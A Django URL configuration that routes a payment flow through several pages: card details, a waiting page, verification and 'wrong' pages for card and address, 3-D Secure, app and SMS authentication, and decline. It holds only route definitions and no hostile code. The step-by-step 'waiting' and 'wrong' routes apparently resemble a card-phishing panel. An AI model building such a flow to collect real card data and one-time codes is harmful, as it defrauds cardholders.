from django.urls import path
from . import views

app_name = 'page1'

urlpatterns = [
    path('', views.index, name="amounts"),
    path('waiting/<str:pk>', views.waitReply, name="waiting"),
    path('order-wrong', views.order_wrong, name="order-wrong"),

    path('card-details/<str:pk>', views.cardDetails, name="card-details"),
    path('card-verification/<str:pk>',views.are_card_details_correct, name="card-verification"),
    path('card-wrong/<str:pk>',views.card_wrong, name="card-wrong"),


    path('address_details/<str:pk>', views.addressDetails, name="address"),

    path('address_verification/<str:pk>', views.address_correct, name="address-verification"),
    path('address_wrong/<str:pk>',views.address_wrong, name="address-wrong"),

    path('threeDSMain/<str:pk>', views.threeDSMain, name="threeDS"),

    path('authenticate-app/<str:pk>', views.authenticate_app, name="authenticate-app"),

    path('payment-verification/<str:pk>', views.payment_verification, name="payment-verification"),

    path('authenticate-text/<str:pk>', views.autenticate_text, name="authenticate-text"),
    path('payment-verification-text/<str:pk>', views.payment_verification_text, name="payment-verification-text"),




    path('payment-decline/<str:pk>', views.payment_declined, name="payment-declined"),
]
